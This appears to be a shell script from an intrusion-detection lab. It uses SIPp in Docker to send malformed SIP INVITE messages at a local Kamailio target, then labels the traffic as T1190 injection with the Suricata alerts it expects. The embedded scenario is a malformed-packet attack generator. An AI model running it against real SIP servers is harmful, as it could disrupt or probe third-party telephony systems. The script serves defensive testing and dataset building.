#!/usr/bin/env bash
# Injection: malformed SIP INVITE traffic against the local Kamailio lab target.
# MITRE: T1190 (Exploit Public-Facing Application)
# Expected detections: Suricata SIDs 1000006, 1000007, and 1000008.
...
echo "==> SIPp malformed INVITE ${TARGET_HOST}:${TARGET_PORT} calls=${CALLS} rate=${RATE}/s network=${NETWORK}"
docker run --rm -i \
  --network "${NETWORK}" \
  --cap-drop ALL \
  ...
  --entrypoint /bin/sh \
  "${SIPP_IMAGE}" \
  -ec 'cat > /tmp/sippts_malformed_invite.xml
exec /usr/local/bin/sipp "${TARGET_HOST}:${TARGET_PORT}" \
  -sf /tmp/sippts_malformed_invite.xml \
  -m "${CALLS}" \
  -r "${RATE}" \
  -t u1 \
  -nostdin' <<'XML'
<?xml version="1.0" encoding="ISO-8859-1" ?>
<scenario name="sippts malformed INVITE">
  <send>
    <![CDATA[
INVITE sip:1000@[remote_ip]:[remote_port] SIP/2.0
Via: sippts-malformed-[call_number]
From: <sip:sippts@[local_ip]>;tag=[call_number]
To: <sip:1000@[remote_ip]>
Call-ID: malformed-[call_id]
CSeq: INVITE [call_number]
Max-Forwards: 70
User-Agent: sippts
Content-Length: 0
...
PYTHONPATH="${REPO_ROOT}${PYTHONPATH:+:${PYTHONPATH}}" python3 -m attacks.orchestrator.label_emitter \
  "${LABEL_SRC_IP}" \
  "sippts_malformed_invite" \
  "T1190" \
  "injection" \
  "SIPp malformed INVITE via ${NETWORK} to ${TARGET_HOST}:${TARGET_PORT}; calls=${CALLS}; rate=${RATE}/s"
